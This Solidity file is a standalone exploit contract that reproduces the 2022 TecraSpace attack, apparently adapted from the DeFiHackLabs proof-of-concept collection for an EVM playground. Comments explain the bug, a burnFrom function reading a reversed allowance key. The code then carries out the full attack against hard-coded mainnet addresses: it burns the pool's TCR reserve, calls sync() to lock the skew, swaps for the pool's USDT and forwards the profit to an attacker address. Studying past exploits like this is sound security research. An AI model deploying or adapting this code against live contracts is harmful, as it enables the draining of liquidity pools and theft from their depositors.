// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-02-TecraSpace).
// The DeFiHackLabs PoC (2022-02-TecraSpace_exp/test/TecraSpace_exp.sol) runs the
// attack INLINE in the Foundry `ExploitTest` test contract — `address(this)` is the
// attacker and there is no standalone contract to deploy. This file is a faithful,
// self-contained copy of that inline attack (testExploit body → run()), with
// minimal inlined interfaces so it compiles anywhere. Logic and constants are
// copied verbatim from the registry test.
//
// Root cause: TcrToken.burnFrom reads the WRONG side of the allowance mapping —
// `_allowances[msg.sender][from]` instead of `_allowances[from][msg.sender]`. The
// caller (msg.sender) controls its own allowance, so `TCR.approve(pool, max)` self-
// satisfies the guard and lets the caller burn the pool's TCR reserve via
// `burnFrom(pool, poolBalance)`. Burning one side of the Uniswap V2 pair without
// removing the other breaks k in the attacker's favour; a `sync()` locks the skew
// and a follow-up swap dumps the attacker's TCR for the pool's USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
}

interface IUSDT {
    // USDT's legacy approve returns void
    function approve(address, uint256) external;
}

interface ITcrToken {
    function burnFrom(address from, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

interface IUniswapV2Router {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Pair {
    function sync() external;
}

contract TecraSpaceBurnFrom {
    address constant TCR = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant POOL = 0x420725A69E79EEffB000F98Ccd78a52369b6C5d4;
    uint256 constant MAX = type(uint256).max;

    address immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function run() external {
        // step 1: approve USDT/TCR to the router, and crucially TCR -> pool, which
        // sets _allowances[attacker][pool] = max (the reversed key burnFrom reads).
        IUSDT(USDT).approve(ROUTER, MAX);
        ITcrToken(TCR).approve(ROUTER, MAX);
        ITcrToken(TCR).approve(POOL, MAX);

        // step 2: buy TCR cheaply — swapExactETHForTokens(WETH -> USDT -> TCR).
        uint256 wethAmount = address(this).balance;
        address[] memory path = new address[](3);
        path[0] = WETH;
        path[1] = USDT;
        path[2] = TCR;
        uint256 deadline = block.timestamp + 24 hours;
        IUniswapV2Router(ROUTER).swapExactETHForTokens{value: wethAmount}(1, path, address(this), deadline);

        // step 3: burnFrom(pool, poolTCR - 1e8). msg.sender = this contract; the
        // buggy check reads _allowances[this][pool] = max -> passes, burning the
        // pool's TCR reserve and breaking the constant-product invariant.
        uint256 poolTCRbalance = IERC20(TCR).balanceOf(POOL);
        ITcrToken(TCR).burnFrom(POOL, poolTCRbalance - 100_000_000);

        // step 4: sync() locks the skewed reserves (TCR hyper-scarce vs USDT).
        IUniswapV2Pair(POOL).sync();

        // step 5: dump the attacker's TCR for the pool's USDT at a favourable price.
        uint256 attackerTCRbalance = IERC20(TCR).balanceOf(address(this));
        address[] memory path2 = new address[](2);
        path2[0] = TCR;
        path2[1] = USDT;
        IUniswapV2Router(ROUTER).swapExactTokensForTokens(attackerTCRbalance, 1, path2, address(this), deadline);

        // step 6: forward the USDT profit to the attacker EOA.
        uint256 profit = IERC20(USDT).balanceOf(address(this));
        // USDT has a non-standard transfer (no bool return); call via IUSDT-style
        // interface through a low-level call to be safe across implementations.
        (bool ok,) = USDT.call(abi.encodeWithSignature("transfer(address,uint256)", attacker, profit));
        require(ok, "usdt transfer failed");
    }

    // Receive the ETH seed forwarded by the attacker in setup.
    receive() external payable {}
}
